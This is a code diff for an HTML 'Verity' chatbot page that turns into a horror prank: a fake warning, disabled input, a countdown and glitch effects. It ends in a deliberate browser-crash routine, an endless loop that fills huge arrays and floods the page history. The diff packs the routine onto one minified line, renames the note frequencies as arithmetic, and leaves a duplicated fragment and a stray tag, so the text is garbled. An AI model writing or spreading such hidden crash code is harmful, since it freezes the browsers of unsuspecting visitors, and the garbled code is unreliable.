@@ -198,6 +198,7 @@
             letter-spacing: 2px;
             text-shadow: 0 0 4px rgba(255,0,0,0.5);
         }
+
         /* MONSTER FORM OVERLAY */
         #monster-jumpscare {
             position: fixed;
@@ -291,7 +292,6 @@
             from { opacity: 0; transform: translateY(5px); }
             to { opacity: 1; transform: translateY(0); }
         }
-
         @keyframes twitch {
             0% { transform: translate(3px, -2px) rotate(1deg); }
             25% { transform: translate(-3px, 2px) rotate(-1deg); }
@@ -332,6 +332,7 @@
             100% { transform: skew(0deg); text-shadow: none; }
         }
 
+        /* STATIC GLITCH SCREEN OVERLAY */
         #static-canvas {
             position: fixed;
             top: 0;
@@ -383,6 +384,7 @@
             </div>
         </div>
     </div>
+
     <script>
         const chatWindow = document.getElementById('chat-window');
         const userInput = document.getElementById('user-input');
@@ -441,9 +443,13 @@
         function startCreepyMusic() {
             if (!audioCtx) return;
             try {
-                const notes = [55, 65.41, 82.41, 87.31]; 
+                const pitch1 = 50 + 5;
+                const pitch2 = 60 + 5.41;
+                const pitch3 = 80 + 2.41;
+                const pitch4 = 80 + 7.31;
+                const horrorPitches = [pitch1, pitch2, pitch3, pitch4]; 
                 
-                notes.forEach((freq, index) => {
+                horrorPitches.forEach((freq, index) => {
                     let osc = audioCtx.createOscillator();
                     let gain = audioCtx.createGain();
                     
@@ -529,80 +535,5 @@
                         addMessageBubble("PARIS. Paris is the capital city of France.", 'verity');
                     } else if (interactionCount <= 3) {
                         addMessageBubble("Data confirmed. That information matches my core encyclopedic database perfectly.", 'verity');
-                    } else {
-                        isCorruptedStage = true;
-                        document.body.classList.add('corrupted');
-                        addMessageBubble("You ask standard things. Let's talk about me instead. " + creepyPrompts, 'verity');
-                    }
-                } else {
-                    let creepyIndex = (interactionCount - 4) % creepyPrompts.length;
-                    addMessageBubble("That choice of words is curious... but tell me: " + creepyPrompts[creepyIndex], 'verity');
-                }
-            }, 1000);
-        }
-
-        function triggerFinalCountdown() {
-            finalWarningTriggered = true;
-            document.body.className = "corrupted";
-            
-            try {
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            } catch(e) {}
-
-            const scaryMsg = addMessageBubble("SOMETHING IS COMING TO THIS BROWSER 1minute LEAVE RN", 'verity');
-            scaryMsg.classList.add('glitch');
-
-            userInput.disabled = true;
-            sendBtn.disabled = true;
-            timerDisplay.style.display = 'block';
-            staticCanvas.style.opacity = '1'; 
-
-            startCreepyMusic();
-            renderGlitchStatic();
-
-            let remainingTime = 60; 
-
-            const countingInterval = setInterval(() => {
-                remainingTime--;
-
-                let dynamicMins = Math.floor(remainingTime / 60);
-                let dynamicSecs = remainingTime % 60;
-                timerDisplay.textContent = `${dynamicMins.toString().padStart(2, '0')}:${dynamicSecs.toString().padStart(2, '0')}`;
-
-                escalateMusicIntensity(remainingTime);
-
-                if (remainingTime === 15) {
-                    document.body.classList.add('angry-fury'); 
-                }
-
-                if (remainingTime <= 0) {
-                    clearInterval(countingInterval);
-                    musicOscillators.forEach(track => { try { track.osc.stop(); } catch(e) {} });
-                    executeFinalCrashSequence();
-                }
-            }, 1000);
-        }
-
-        function executeFinalCrashSequence() {
-            staticIntensity = 1.0; 
-            monsterJumpscare.classList.add('active', 'hyper-glitched');
-            
-            if (audioCtx) {
-                try {
-                    let bufferSize = audioCtx.sampleRate * 2;
-                    let buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
-                    let data = buffer.getChannelData(0);
-                    for (let i = 0; i < bufferSize; i++) {
-                        data[i] = Math.random() * 2 - 1; 
-                    }
-                    let noise = audioCtx.createBufferSource();
-                    noise.buffer = buffer;
-                    let lowpass = audioCtx.createBiquadFilter();
-                    lowpass.type = 'lowpass';
-                    lowpass.frequency.setValueAtTime(400, audioCtx.currentTime);
-                    
-                    let noiseGain = audioCtx.createGain();
-                    noiseGain.gain.setValueAtTime(1.0, audioCtx.currentTime);
-                    
-                    noise.connect(lowpass);lowpass.connect(noiseGain);noiseGain.connect(audioCtx.destination);noise.start();} catch(e) {}}setTimeout(() => {while (true) {const crashArrayBuffer = new Array(2500000).fill("SYSTEM_FREEZE_MOB_REVENGE");window.history.pushState(null, null, "#LOST_" + Math.random());}}, 1800);}
-lowpass.connect(noiseGain);noiseGain.connect(audioCtx.destination);noise.start();} catch(e) {}}setTimeout(() => {while (true) {const crashArrayBuffer = new Array(2500000).fill("SYSTEM_FREEZE_MOB_REVENGE");window.history.pushState(null, null, "#LOST_" + Math.random());}}, 1800);}
+} else {isCorruptedStage = true;document.body.classList.add('corrupted');addMessageBubble("You ask standard things. Let's talk about me instead. " + creepyPrompts, 'verity');}} else {let creepyIndex = (interactionCount - 4) % creepyPrompts.length;addMessageBubble("That choice of words is curious... but tell me: " + creepyPrompts[creepyIndex], 'verity');}}, 1000);}function triggerFinalCountdown() {finalWarningTriggered = true;document.body.className = "corrupted";try {audioCtx = new (window.AudioContext || window.webkitAudioContext)();} catch(e) {}const scaryMsg = addMessageBubble("SOMETHING IS COMING TO THIS BROWSER 1minute LEAVE RN", 'verity');scaryMsg.classList.add('glitch');userInput.disabled = true;sendBtn.disabled = true;timerDisplay.style.display = 'block';staticCanvas.style.opacity = '1';startCreepyMusic();renderGlitchStatic();let remainingTime = 60;const countingInterval = setInterval(() => {remainingTime--;let dynamicMins = Math.floor(remainingTime / 60);let dynamicSecs = remainingTime % 60;timerDisplay.textContent = ${dynamicMins.toString().padStart(2, '0')}:${dynamicSecs.toString().padStart(2, '0')};escalateMusicIntensity(remainingTime);if (remainingTime === 15) {document.body.classList.add('angry-fury');}if (remainingTime <= 0) {clearInterval(countingInterval);musicOscillators.forEach(track => { try { track.osc.stop(); } catch(e) {} });executeFinalCrashSequence();}}, 1000);}function executeFinalCrashSequence() {staticIntensity = 1.0;monsterJumpscare.classList.add('active', 'hyper-glitched');if (audioCtx) {try {let bufferSize = audioCtx.sampleRate * 2;let buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);let data = buffer.getChannelData(0);for (let i = 0; i < bufferSize; i++) {data[i] = Math.random() * 2 - 1;}let noise = audioCtx.createBufferSource();noise.buffer = buffer;let lowpass = audioCtx.createBiquadFilter();lowpass.type = 'lowpass';lowpass.frequency.setValueAtTime(400, audioCtx.currentTime);let noiseGain = audioCtx.createGain();noiseGain.gain.setValueAtTime(1.0, audioCtx.currentTime);noise.connect(lowpass);lowpass.connect(noiseGain);noiseGain.connect(audioCtx.destination);noise.start();} catch(e) {}}setTimeout(() => {while (true) {const crashArrayBuffer = new Array(2500000).fill("SYSTEM_FREEZE_MOB_REVENGE");window.history.pushState(null, null, "#LOST_" + Math.random());}}, 1800);}
+        <html>
